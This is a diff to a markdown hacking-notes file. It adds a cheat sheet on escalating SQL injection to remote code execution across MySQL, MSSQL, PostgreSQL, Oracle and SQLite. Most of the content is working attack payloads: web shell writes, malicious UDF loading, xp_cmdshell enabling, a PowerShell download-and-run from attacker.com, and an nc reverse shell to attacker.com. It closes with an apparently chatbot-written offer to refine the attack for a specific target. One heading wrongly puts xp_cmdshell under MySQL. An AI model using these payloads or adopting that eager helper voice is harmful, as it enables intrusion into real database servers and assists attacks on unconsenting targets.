@@ -187,7 +187,111 @@
 
 5. **Automation**:
    - Automate SQL injection testing using scripts and tools like Ghauri and SQLMap.
-### SQLI to RCE
+
+
+---
+
+# Exploiting SQL Injection (SQLi) to Achieve Remote Code Execution (RCE)
+
+If you have **SQL Injection (SQLi)**, there are multiple ways to escalate it to **Remote Code Execution (RCE)** depending on the database management system (DBMS) and user privileges. Below are methods for each major DBMS:
+
+---
+
+## **1. MySQL**
+### **A) Using `LOAD_FILE()` or `INTO OUTFILE`**
+- Exploit `LOAD_FILE('/etc/passwd')` to read files (if the user has FILE privileges).
+- Exploit `INTO OUTFILE '/var/www/html/shell.php'` to write a web shell to the server.
+
+### **B) Exploiting User-Defined Functions (UDFs)**
+- Upload a malicious `.so` library to `/usr/lib/` and execute commands:
+  ```sql
+  CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'evil.so';
+  SELECT sys_exec('whoami');
+  ```
+
+### **C) Exploiting `xp_cmdshell` with `sys_exec()`**
+- If **SUPER** privileges are available, use `sys_exec()` in UDFs.
+
+---
+
+## **2. Microsoft SQL Server**
+### **A) Using `xp_cmdshell`**
+- Enable `xp_cmdshell` and execute system commands:
+  ```sql
+  EXEC sp_configure 'show advanced options', 1;
+  RECONFIGURE;
+  EXEC sp_configure 'xp_cmdshell', 1;
+  RECONFIGURE;
+  EXEC xp_cmdshell 'whoami';
+  ```
+
+### **B) Using `OLE Automation Procedures`**
+- Execute **PowerShell** commands:
+  ```sql
+  EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
+  EXEC sp_oamethod @shell, 'run', NULL, 'powershell -c "iex(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"';
+  ```
+
+### **C) Exploiting OpenRowSet + UNC Path**
+- Load a malicious DLL from an SMB share to take control of the server.
+
+---
+
+## **3. PostgreSQL**
+### **A) Using `COPY TO/FROM PROGRAM`**
+- PostgreSQL 9.3+ allows executing system commands:
+  ```sql
+  COPY test FROM PROGRAM 'whoami';
+  ```
+
+### **B) Exploiting `PL/Python` or `PL/Perl`**
+- Execute Python commands inside PostgreSQL:
+  ```sql
+  CREATE FUNCTION exec_cmd(text) RETURNS void AS $$
+    import os
+    os.system('whoami')
+  $$ LANGUAGE plpythonu;
+  SELECT exec_cmd('whoami');
+  ```
+
+---
+
+## **4. Oracle Database**
+### **A) Exploiting `DBMS_SCHEDULER`**
+- Execute system commands:
+  ```sql
+  BEGIN
+    DBMS_SCHEDULER.create_job(
+      job_name => 'pwn',
+      job_type => 'EXECUTABLE',
+      job_action => '/bin/bash -c "nc -e /bin/sh attacker.com 4444"',
+      enabled => TRUE
+    );
+  END;
+  /
+  ```
+
+### **B) Using Java Stored Procedures**
+- Execute system commands through Java inside Oracle.
+
+---
+
+## **5. SQLite**
+- SQLite is limited, but if you control the **database file path**, you may exploit **LFI (Local File Inclusion)** or use `ATTACH DATABASE`.
+
+---
+
+## **Summary**
+| DBMS      | RCE Methods |
+|-----------|--------------------------------------------------|
+| MySQL     | `UDF`, `LOAD_FILE()`, `INTO OUTFILE` |
+| MSSQL     | `xp_cmdshell`, `sp_oacreate`, `OpenRowSet` |
+| PostgreSQL | `COPY FROM PROGRAM`, `PL/Python` |
+| Oracle    | `DBMS_SCHEDULER`, Java Stored Procedures |
+| SQLite    | Limited, but can be exploited via LFI |
+
+These are the primary techniques. If you have a specific target in mind, let me know so we can refine the approach! 🔥
+
 
 ```bash
 ; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE; —
